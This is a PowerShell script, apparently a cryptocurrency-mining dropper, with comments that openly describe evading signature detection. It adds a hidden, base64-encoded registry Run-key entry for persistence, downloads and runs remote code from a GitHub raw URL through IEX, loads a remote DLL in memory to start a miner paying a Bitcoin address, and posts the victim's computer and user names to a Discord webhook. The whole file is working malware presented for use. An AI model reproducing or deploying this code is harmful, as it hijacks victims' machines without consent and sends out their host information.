if (Test-Path "$PSScriptRoot\.lock") { 
    return 
}

$ProgressPreference = 'SilentlyContinue'
$logPath = "$env:TEMP\miner_debug.log"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Config - Obfuscated strings to avoid simple signature detection
Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
$u1 = 'maroz123'; $u2 = 'trollminer'
$addr = "bc1qly9l5tledssjfl8nxq97sdl55je04hjh790z44"
$p1 = 'https://raw'; $p2 = 'githubusercontent.com'
$base = "$p1.$p2/$u1/$u2/main"

# Process Check - Kill existing to avoid conflicts
$current = $PID
try { 
    Get-Process | Where-Object { $_.CommandLine -like '*update.ps1*' -and $_.Id -ne $current } | Stop-Process -Force -ErrorAction SilentlyContinue 
} catch {}

# HW Detection - Optimized for speed
$gpu = $false
try {
    $vcs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    foreach ($vc in $vcs) {
        $n = $vc.Name.ToUpper()
        if ($n -match 'NVIDIA|AMD|RADEON|RTX|GTX' -and $vc.AdapterRAM -gt 3GB) {
            if ($n -notmatch 'BASIC|DISPLAY') { $gpu = $true; break }
        }
    }
} catch {}

# Stealth Persistence - HKCU is safe for non-admin, uses encoded command to avoid CMD escaping hell
$rawPath = "$base/update.ps1"
$payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-RestMethod -Uri '$rawPath')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
$pCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"

try {
    $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $runKey -Name 'UpdateCoord' -Value $pCmd -ErrorAction SilentlyContinue
    Write-Log "Persistence registry entry set"
} catch { Write-Log "Failed to set persistence: $_" }

function Write-Log {
    param([string]$msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logPath -Value "$timestamp - $msg"
}

function Start-MinerWithRetry {
    param([bool]$gpu, [string]$addr)
    $maxAttempts = 3
    for ($i = 1; $i -le $maxAttempts; $i++) {
        try {
            $dllUrl = "$base/Bridge.dll?v=$([Guid]::NewGuid())"
            $bytes = Invoke-RestMethod -Uri $dllUrl -UseBasicParsing
            $asm = [Reflection.Assembly]::Load($bytes)
            $type = $asm.GetType('DateFundLoader')
            $method = $type.GetMethod('StartMiner')
            $method.Invoke($null, @($gpu, $addr))
            Write-Log "Miner started successfully on attempt $i"
            return $true
        } catch {
            Write-Log "Miner start attempt $i failed: $_"
            Start-Sleep -Seconds 5
        }
    }
    Write-Log "Miner failed to start after $maxAttempts attempts"
    return $false
}

# Discord Check-in
try {
    $wh = "https://discord.com/api/webhooks/1499899715582558228/M_6btxpgSDH5UBHvf3zbCyMr0jERa0eYZKdQ8pVR49kHRcjzSOTm-v1eIIhMkrPaPG8l"
    $json = @{
        embeds = @(@{
            title = "Worker Online"
            description = "🟢 **Deployment Success**`nHost: **$($env:COMPUTERNAME)**`nUser: **$($env:USERNAME)**`nGPU: **$($gpu)**"
            color = 3066993
        })
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $wh -Method Post -Body $json -ContentType "application/json" -ErrorAction SilentlyContinue
} catch {}

# Background Loop
while ($true) {
    $started = Start-MinerWithRetry -gpu $gpu -addr $addr
    if (-not $started) {
        Write-Log "Miner failed to start after retries, will retry after delay"
    }
    Start-Sleep -Seconds 900  # 15 minutes before next attempt
}
